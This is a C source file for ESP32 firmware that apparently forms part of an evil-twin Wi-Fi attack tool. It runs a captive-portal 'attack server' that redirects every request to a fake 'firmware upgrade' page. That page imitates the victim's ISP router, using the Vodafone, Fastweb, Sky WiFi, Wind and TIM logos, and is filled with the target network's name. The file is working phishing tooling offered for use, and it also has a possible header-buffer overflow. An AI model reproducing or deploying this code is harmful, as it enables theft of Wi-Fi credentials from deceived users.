#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "spi_flash_mmap.h"

#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/event_groups.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/api.h>
#include <lwip/netdb.h>
#include "esp_http_server.h"

#include "server.h"
#include "evil_twin.h"

#include "web/web_page.h"
#include "web/web_net_manager.h"

#include "web/logo/vodafone.h"
#include "web/logo/fastweb.h"
#include "web/logo/skywifi.h"
#include "web/logo/wind.h"
#include "web/logo/tim.h"
#include "web/logo/generic.h"
#include "web/loader.h"
#include "web/firmware_upgrade/index.h"

#define CHUNK_SIZE 512

static const char *TAG = "HTTPD";	//TAG for debug
static const char *host = "vodafone.station";
static const char *captive_portal_url = "http://192.168.4.1/index.html";
static httpd_handle_t server = NULL;
static target_info_t target = { 0 };


static void httpd_send_chunked_data(httpd_req_t *req, const char *buffer, size_t len, const char *response_type)
{
	size_t bytes_remaining = len-1;
    size_t offset = 0;

	/* Set basic text/html if response type is not specified */
	if( response_type == NULL )
	{
		httpd_resp_set_type(req, "text/html");
	}
	else
	{
		httpd_resp_set_type(req, response_type);
	}

	httpd_resp_set_hdr(req, "Connection", "keep-alive");
    while (bytes_remaining > 0) 
	{
        size_t chunk_size = (bytes_remaining > CHUNK_SIZE) ? CHUNK_SIZE : bytes_remaining;
        httpd_resp_send_chunk(req, buffer + offset, chunk_size);
        offset += chunk_size;
        bytes_remaining -= chunk_size;
    }
	httpd_resp_send_chunk(req, NULL, 0);
}


/**
 * @brief This function manage the file in the virtual folder /static/
 * 
 * @param req 
 */
static void web_virtual_static_folder_manager(httpd_req_t *req)
{
	/* bootstrap.min.css */
	if( strcmp(req->uri, "/static/bootstrap.min.css") == 0 )
	{
		//httpd_send_chunked_data(req, bootstrap_min_css, sizeof(bootstrap_min_css), "text/css");
	}
	/* bootstrap.min.js */
	else if( strcmp(req->uri, "/static/bootstrap.min.js") == 0 )
	{
		//httpd_send_chunked_data(req, bootstrap_min_js, sizeof(bootstrap_min_js), "application/javascript");
	}
	/* jquery.min.js */
	else if( strcmp(req->uri, "/static/jquery.min.js") == 0 )
	{
		//httpd_send_chunked_data(req, jquery_min_js, sizeof(jquery_min_js), "application/javascript");
	}
}


/**
 * @brief This function manage the file in the virtual folder /logo/
 * 
 * @param req 
 */
static void web_virtual_logo_folder_manager(httpd_req_t *req)
{
	/* Generic logo */
	if( strcmp(req->uri, "/logo/Generic.png") == 0 )
	{
		httpd_send_chunked_data(req, generic_logo, sizeof(generic_logo), "image/png");
	}
	/* Vodafone logo */
	else if( strcmp(req->uri, "/logo/Vodafone.png") == 0 )
	{
		httpd_send_chunked_data(req, vodafone_logo, sizeof(vodafone_logo), "image/png");
	}
	/* Fastweb logo */
	else if( strcmp(req->uri, "/logo/Fastweb.png") == 0 )
	{
		httpd_send_chunked_data(req, fastweb_logo, sizeof(fastweb_logo), "image/png");
	}
	/* Skywifi logo */
	else if( strcmp(req->uri, "/logo/Skywifi.png") == 0 )
	{
		httpd_send_chunked_data(req, skywifi_logo, sizeof(skywifi_logo), "image/png");
	}
	/* windtre logo */
	else if( strcmp(req->uri, "/logo/Wind.png") == 0 )
	{
		httpd_send_chunked_data(req, wind_logo, sizeof(wind_logo), "image/png");
	}
	/* tim logo */
	else if( strcmp(req->uri, "/logo/TIM.png") == 0 )
	{
		httpd_send_chunked_data(req, tim_logo, sizeof(tim_logo), "image/png");
	}
	/* Generic */
	else
	{
		httpd_send_chunked_data(req, generic_logo, sizeof(generic_logo), "image/png");
	}
}


/**
 * @brief Manage the firmware upgrade attack index request
 * 
 * @param req 
 */
static void firmware_upgrade_index_manager(httpd_req_t *req)
{
	httpd_resp_set_hdr(req, "Connection", "keep-alive");
	httpd_resp_set_type(req, "text/html");
	httpd_resp_send_chunk(req, fu_index_header_html, sizeof(fu_index_header_html));

	/* Fill data */
	char script_data[150];
	snprintf(script_data, sizeof(script_data), fu_index_script_html, vendorToString(target.vendor), (char *)&target.ssid, vendorToString(target.vendor));
	httpd_resp_send_chunk(req, script_data, strlen(script_data));

	httpd_resp_send_chunk(req, fu_index_body_html, sizeof(fu_index_body_html));
	httpd_resp_send_chunk(req, NULL, 0);
}


/**
 * @brief All request all redirected here
 * 
 * @param req 
 */
static void captive_portal_redirect(httpd_req_t *req)
{
	/* Index */
	if( strcmp(req->uri, "/index.html") == 0 )
	{
		switch(target.attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				firmware_upgrade_index_manager(req);
				break;
			
			case WEB_NET_MANAGER:
				break;

			case PLUGIN_UPDATE:
				break;

			case OAUTH_LOGIN:
				break;

			default:
				break;
		}
		return;
	}
	/* loader.html same for all */
	else if( strcmp(req->uri, "/loader.html") == 0 )
	{
		httpd_send_chunked_data(req, loader_html, sizeof(loader_html), NULL);
	}
	/* Static folder manager */
	else if( strstr(req->uri, "/static/") != NULL )
	{
		web_virtual_static_folder_manager(req);
	}
	/* logo folder manager */
	else if( strstr(req->uri, "/logo/") != NULL )
	{
		web_virtual_logo_folder_manager(req);
	}
	/* favicon.ico */
	else if( strcmp(req->uri, "/favicon.ico") == 0 )
	{
		httpd_resp_send(req, NULL, 0);
	}
	/* Activate captive portal */
	else
	{
		httpd_resp_set_status(req, "302 Found");
		httpd_resp_set_hdr(req, "Host", host);
		httpd_resp_set_hdr(req, "Location", captive_portal_url);
		httpd_resp_send(req, NULL, 0);
		return;
	}
}


static esp_err_t redirect_handler(httpd_req_t *req) 
{
	/* Request information */
	char Host[64] = { 0 };
	char UserAgent[128] = { 0 };
	char ContentType[64] = { 0 };
	char ContentLen[8] = { 0 };
	char Referer[64] = { 0 };

	/* Read request header */
	int len = httpd_req_get_hdr_value_len(req, "Host");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Host", Host, len+1);
    }
	len = httpd_req_get_hdr_value_len(req, "User-Agent");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "User-Agent", UserAgent, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Type");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Type", ContentType, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Length");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Length", ContentLen, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Referer");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Referer", Referer, len);
    }

	captive_portal_redirect(req);

    return ESP_OK;
}


void http_attack_server_start(target_info_t *_target_info)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Attack server already started.");
		return;
	}

	/* Copy target info */
	memcpy(&target, _target_info, sizeof(target_info_t));

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.max_resp_headers = 16;
	config.recv_wait_timeout = 10;
	config.send_wait_timeout = 10;
	config.lru_purge_enable = true;

    if (httpd_start(&server, &config) == ESP_OK) 
	{
        httpd_uri_t redirect_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = redirect_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(server, &redirect_uri);
    }
	else
	{
		ESP_LOGE(TAG, "Failed to start captive portal server.");
	}
}


void http_attack_server_stop(void)
{
	if( server != NULL )
    {
        if( httpd_stop(server) != ESP_OK )
        {
            ESP_LOGD(TAG, "Failed to stop attack server.");
            return;
        }
    }
}